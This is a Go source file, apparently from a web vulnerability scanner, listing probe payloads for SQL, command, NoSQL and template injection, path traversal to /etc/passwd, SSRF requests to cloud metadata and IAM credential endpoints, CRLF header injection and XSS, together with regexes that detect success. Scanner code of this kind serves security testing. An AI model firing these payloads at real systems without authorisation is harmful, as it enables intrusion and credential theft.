package scan

import (
	"crypto/rand"
	"encoding/hex"
	"regexp"
)

func marker() string {
	b := make([]byte, 5)
	rand.Read(b)
	return "sx" + hex.EncodeToString(b)
}

var sqlErrorPayloads = []string{"'", "\"", "')", "';", "`", "\\"}

var sqlBooleanPairs = [][2]string{
	{"' AND '1'='1", "' AND '1'='2"},
	{"\" AND \"1\"=\"1", "\" AND \"1\"=\"2"},
	{" AND 1=1", " AND 1=2"},
	{"' OR '1'='1' -- ", "' OR '1'='2' -- "},
	{") AND (1=1", ") AND (1=2"},
}

var sqlTimeTemplates = []func(sec int) string{
	func(s int) string { return "' AND SLEEP(" + itoa(s) + ")-- -" },
	func(s int) string { return "\" AND SLEEP(" + itoa(s) + ")-- -" },
	func(s int) string { return "' AND (SELECT " + itoa(s) + " FROM (SELECT SLEEP(" + itoa(s) + "))a)-- -" },
	func(s int) string { return "'; WAITFOR DELAY '0:0:" + itoa(s) + "'-- -" },
	func(s int) string { return "' || pg_sleep(" + itoa(s) + ")-- -" },
	func(s int) string { return "1)) AND SLEEP(" + itoa(s) + ")-- -" },
}

var cmdTimeTemplates = []func(sec int) string{
	func(s int) string { return "; sleep " + itoa(s) },
	func(s int) string { return "| sleep " + itoa(s) },
	func(s int) string { return "|| sleep " + itoa(s) },
	func(s int) string { return "$(sleep " + itoa(s) + ")" },
	func(s int) string { return "`sleep " + itoa(s) + "`" },
	func(s int) string { return "& ping -n " + itoa(s+1) + " 127.0.0.1 &" },
}

var traversalPayloads = []string{
	"../../../../../../etc/passwd",
	"....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"../../../../../../etc/passwd%00",
	"..\\..\\..\\..\\..\\windows\\win.ini",
	"..%5c..%5c..%5c..%5cwindows%5cwin.ini",
	"/etc/passwd",
	"file:///etc/passwd",
}

var passwdSig = regexp.MustCompile(`root:.*?:0:0:`)
var winIniSig = regexp.MustCompile(`(?i)\[(?:extensions|fonts|mci extensions)\]|for 16-bit app support`)

var redirectParamNames = regexp.MustCompile(`(?i)^(?:url|uri|redirect|redirect_uri|redir|return|return_url|returnurl|next|dest|destination|continue|forward|go|goto|target|link|out|u|r|to|callback|rurl|view|image_url|checkout_url)$`)

var ssrfParamNames = regexp.MustCompile(`(?i)^(?:url|uri|path|dest|destination|redirect|callback|webhook|image|img|imageurl|file|host|domain|feed|site|proxy|fetch|load|resource|next|data|reference|ref)$`)

var ssrfPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://127.0.0.1:80/",
	"http://localhost/",
	"http://[::1]/",
}

var ssrfSig = regexp.MustCompile(`(?i)ami-id|instance-id|iam/security-credentials|computeMetadata|<title>.*(?:localhost|127\.0\.0\.1)`)

var sstiEngines = []struct {
	name string
	tmpl func(a, b int) string
}{
	{"Jinja2/Twig", func(a, b int) string { return "${{" + itoa(a) + "*" + itoa(b) + "}}" }},
	{"Jinja2/Twig", func(a, b int) string { return "{{" + itoa(a) + "*" + itoa(b) + "}}" }},
	{"Ruby ERB", func(a, b int) string { return "<%= " + itoa(a) + "*" + itoa(b) + " %>" }},
	{"Freemarker", func(a, b int) string { return "${" + itoa(a) + "*" + itoa(b) + "}" }},
	{"Velocity/Thymeleaf", func(a, b int) string { return "#{" + itoa(a) + "*" + itoa(b) + "}" }},
	{"Smarty", func(a, b int) string { return "{" + itoa(a) + "*" + itoa(b) + "}" }},
}

var crlfPayloads = []struct {
	payload string
	encode  bool
}{
	{"\r\nSift-Injected: 1", true},
	{"%0d%0aSift-Injected:%201", false},
	{"%E5%98%8A%E5%98%8DSift-Injected:%201", false},
	{"\r\n\r\n<sift>", true},
}

const crlfHeader = "Sift-Injected"

var nosqlErrorSig = regexp.MustCompile(`(?i)MongoError|MongoServerError|unexpected token|BadValue|\$where|CastError|E11000|command failed`)

var nosqlPayloads = []string{"'", "\";return true;//", "'\"`{\r\n$where}", "[$ne]"}

var xssBreakouts = []struct {
	name    string
	payload string
	marker  func(m string) string
}{
	{"HTML element", `<%s>`, func(m string) string { return "<" + m + ">" }},
	{"attribute", `"><%s>`, func(m string) string { return "<" + m + ">" }},
	{"single-quote attribute", `'><%s>`, func(m string) string { return "<" + m + ">" }},
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	if neg {
		b = append([]byte{'-'}, b...)
	}
	return string(b)
}
